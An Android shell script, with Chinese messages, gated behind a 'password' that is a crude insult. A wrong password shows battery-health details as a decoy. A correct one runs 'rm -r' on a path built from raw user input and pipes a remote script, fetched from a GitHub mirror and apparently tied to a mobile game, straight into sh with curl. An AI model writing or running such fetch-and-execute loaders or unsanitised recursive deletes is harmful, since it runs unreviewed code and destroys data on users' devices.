rm -r /data/小叽猪/26
clear
echo "输入密码"
read a
echo 嘿嘿 > /data/小叽猪/$a
echo "密码验证中"
sleep 0.5
FILE=/data/小叽猪/你妈死了
if [ ! -f "$FILE" ]; then
    echo "密码错误"
    rm -r /data/小叽猪/$a
sleep 0.3
    echo "⚠️⚠️⚠️⚠️⚠️⚠️"
    echo "\033[30m设备厂商:\033[0m"
getprop ro.product.brand
echo "\033[30m\n设备型号:\033[0m"
getprop ro.product.model
#使用小米售后的方式查询
a=$(su -c cat /sys/class/qcom-battery/soh)
#查看出厂设计容量
cc=$(cat /sys/class/power_supply/battery/charge_full_design)
charge_full_design=$(($cc / 1000))
#查看当前电池容量
dc=$(cat /sys/class/power_supply/battery/charge_full)
charge_full=$(($dc / 1000))
#查看电池循环次数
xh=$(cat /sys/class/power_supply/battery/cycle_count)
#计算剩余容量百分比
bfb=$(printf "%d" $((${dc}*100/${cc})))
echo "\033[30m小米售后查询当前电池寿命为 ${a}%\033[0m"
echo
echo "\033[30m出厂设计容量为 ${charge_full_design}mAh\033[0m"
echo
echo "\033[30m当前电池容量为 ${charge_full}mAh\033[0m"
echo
echo "\033[30m电池循环次数为 $xh次\033[0m"
echo
echo "\033[30m剩余容量百分比为 $bfb%\033[0m"

    exit 1
    exit
fi
clear
echo "欢迎使用"

rm -r /data/小叽猪/$a


test ! $? -eq 0 && exit 1









curl -s https://github.moeyy.xyz/https://raw.githubusercontent.com/ACEiptables/HPJY/main/ces.sh | sh






